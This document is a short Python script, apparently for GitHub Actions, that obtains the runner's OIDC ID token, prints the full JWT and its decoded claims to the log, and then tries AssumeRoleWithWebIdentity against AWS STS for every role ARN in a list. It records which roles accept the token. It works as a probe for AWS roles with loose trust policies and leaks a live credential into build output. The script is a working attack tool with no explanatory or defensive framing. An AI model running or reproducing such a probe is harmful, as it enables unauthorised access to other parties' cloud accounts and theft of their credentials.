import os,json,base64,re,time,urllib.request,urllib.parse,urllib.error,sys
url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
print("URL_PRESENT", bool(url), "REQTOK_LEN", len(tok), flush=True)
if not url:
    print("NO_ID_TOKEN_URL"); sys.exit(0)
req=urllib.request.Request(url+"&audience=sts.amazonaws.com", headers={"Authorization":"bearer "+tok})
jwt=json.load(urllib.request.urlopen(req,timeout=30))["value"]
print("JWT_LEN",len(jwt)); print("JWT",jwt)
def dec(s):
    s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s).decode()
print("HDR",dec(jwt.split('.')[0]))
print("CLM",dec(jwt.split('.')[1]))
roles=[l.strip() for l in open("roles.txt") if l.strip()]
for arn in roles:
    data=urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15","RoleArn":arn,"RoleSessionName":"hk5100","WebIdentityToken":jwt}).encode()
    try:
        resp=urllib.request.urlopen(urllib.request.Request("https://sts.amazonaws.com/",data=data,method="POST"),timeout=20)
        body=resp.read().decode(); code=re.search(r"<Code>([^<]+)",body)
        print(f"STS|{arn}|{resp.status}|{code.group(1) if code else 'UNKNOWN'}", flush=True)
    except urllib.error.HTTPError as e:
        body=e.read().decode(); code=re.search(r"<Code>([^<]+)",body)
        print(f"STS|{arn}|{e.code}|{code.group(1) if code else 'NOCODE'}", flush=True)
    except Exception as e:
        print(f"STS|{arn}|ERR|{type(e).__name__}", flush=True)
    time.sleep(1)
